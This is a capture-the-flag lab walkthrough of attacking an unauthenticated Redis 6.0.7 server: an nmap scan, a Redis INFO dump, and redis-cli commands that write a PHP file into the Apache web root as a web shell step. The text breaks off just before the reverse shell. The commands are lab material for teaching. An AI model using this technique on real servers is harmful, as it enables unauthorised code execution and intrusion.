<h1 align="center">Challenge 035 - Res </h1>
<div align="center">
  <img <img src="https://github.com/user-attachments/assets/066dfa4e-a39c-408d-bf19-81a48730393a" alt="Res" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️  </p>

In this challenge we will hack into a vulnerable database server with an in-memory data-structure. It's once again semi-guided, so beating it should not be that big of a deal.

At the beginning the usual port scan is expected from us, so we use nmap

```
root@ip-10-10-126-129:~# nmap -p- -sV 10.10.52.131
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-06 16:28 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.52.131
Host is up (0.00027s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7
MAC Address: 02:6D:71:8D:1F:F3 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds
```

We see that two ports are open. The classical http port 80, but also redis on port 6379, which is an in-memory NoSQL data store and cache that provides high-performance, low-latency access to data, primarily used for caching, session management and real-time data applications.

Since the task also asked for the versio of the management system, we quickly state it to: 6.0.7.

When visiting the http site we were greeted with the Default Page of Apache. Nothing much to get out of that site even when checking the Page Source.

<img width="858" height="739" alt="image" src="https://github.com/user-attachments/assets/ca1f6380-b8a5-455b-9dec-1a55182b4cc2" />

So we swiftly moved on with the database server through the terminal

```
root@ip-10-10-126-129:~# redis-cli -h 10.10.52.131 
10.10.52.131:6379>
```

And we are in. We didn't need any authentification to log in. Through INFO we get a general idea of the specs of this database management system

```
10.10.52.131:6379> INFO
# Server
redis_version:6.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:5c906d046e45ec07
redis_mode:standalone
os:Linux 4.4.0-189-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:5.4.0
process_id:586
run_id:5b278a060df01e534f0a957d2483d17f8d9d6aed
tcp_port:6379
uptime_in_seconds:1883
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:14935756
executable:/home/vianka/redis-stable/src/redis-server
config_file:/home/vianka/redis-stable/redis.conf
io_threads_active:0

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:588008
used_memory_human:574.23K
used_memory_rss:4829184
used_memory_rss_human:4.61M
used_memory_peak:588008
used_memory_peak_human:574.23K
used_memory_peak_perc:100.00%
used_memory_overhead:541522
used_memory_startup:524536
used_memory_dataset:46486
used_memory_dataset_perc:73.24%
allocator_allocated:838032
allocator_active:1142784
allocator_resident:3379200
total_system_memory:1038393344
total_system_memory_human:990.29M
used_memory_lua:37888
used_memory_lua_human:37.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.36
allocator_frag_bytes:304752
allocator_rss_ratio:2.96
allocator_rss_bytes:2236416
rss_overhead_ratio:1.43
rss_overhead_bytes:1449984
mem_fragmentation_ratio:8.85
mem_fragmentation_bytes:4283680
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:16986
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1759764337
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:5
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:1242
total_net_output_bytes:22643
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:29
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:11
total_writes_processed:9
io_threaded_reads_processed:0
io_threaded_writes_processed:0

# Replication
role:master
connected_slaves:0
master_replid:60e1490b3ce07baeec5e45427174aecdf454ef6e
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.888000
used_cpu_user:0.924000
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#redis-rce

# Modules

# Cluster
cluster_enabled:0

# Keyspace
10.10.52.131:6379> root@ip-10-10-126-129:~# redis-cli -h 10.10.52.131 
(error) ERR unknown command `root@ip-10-10-126-129:~#`, with args beginning with: `redis-cli`, `-h`, `10.10.52.131`, 
```

By browsing the internet there was a very insightful page that has a lot of valuable information about how a database like redis can be exploited. It's called https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#redis-rce

In here it gets mentioned that we can use a PHP webshell. The only thing we need to know for that is the path of the Web site folder. As we remember from the Default page of Apache the file is located at var/www/html. We set up the netcat listener and proceed to follow suit with the HackTricks instructions.

```
10.10.52.131:6379[1]> config set dir /var/www/html
OK
10.10.52.131:6379[1]> config set dbfilename redis.php
OK
10.10.52.131:6379[1]> set test "<?php phpinfo(); ?>"
OK
10.10.52.131:6379[1]> save
OK
```

Testing out the shell seemed to be a success. After checking out for said php file in the web site I got the following result.

<img width="976" height="873" alt="image" src="https://github.com/user-attachments/assets/f1ced7fd-445c-4aae-aca4-bceb6fcb8a37" />

Now it was time to execute a real reverse shell to compromise the machine
